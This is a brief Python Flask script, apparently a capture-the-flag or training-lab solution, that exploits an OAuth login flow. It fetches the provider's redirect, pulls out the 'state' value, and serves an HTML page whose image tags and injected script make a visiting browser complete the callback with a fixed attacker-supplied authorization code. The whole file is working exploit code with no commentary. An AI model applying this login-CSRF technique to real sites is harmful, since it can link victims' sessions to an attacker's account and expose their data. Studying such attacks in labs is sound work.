#imports
import requests
from flask import Flask
from http.server import HTTPServer, CGIHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

app = Flask(__name__)
@app.route("/")
def exploitFunc():
#vars
    geturl = "http://ptl-357e63f6-544b1c72.libcurl.so/users/auth/myprovider"
    get = requests.get(geturl, allow_redirects=False)
    getLoc = get.headers.get('Location')
    parsedLoc = urlparse(getLoc)
    state = parse_qs(parsedLoc.query).get('state')
    redirURL = 'http://ptl-357e63f6-544b1c72.libcurl.so/users/auth/myprovider/callback?code=5eb52ec6ef4c65b8d28561aa2b650a53b1dea2139b8e50a2aeaf80e2e05ea64a&state='
    htmlStr = "<html><body>"
    htmlStr += "<img src='http://ptl-357e63f6-544b1c72.libcurl.so/users/auth/myprovider' />"
    htmlStr += "<script>setTimeout(function() {document.write(\"<img src='"+redirURL+state[0]+"'/>\");},2000);</script>"
    htmlStr += "</body></html>"
    return htmlStr
#file = open("exploit6.html", "w")
#file.write(htmlStr)

#httpd = HTTPServer(('0.0.0.0', 8000), CGIHTTPRequestHandler)
#httpd.serve_forever()
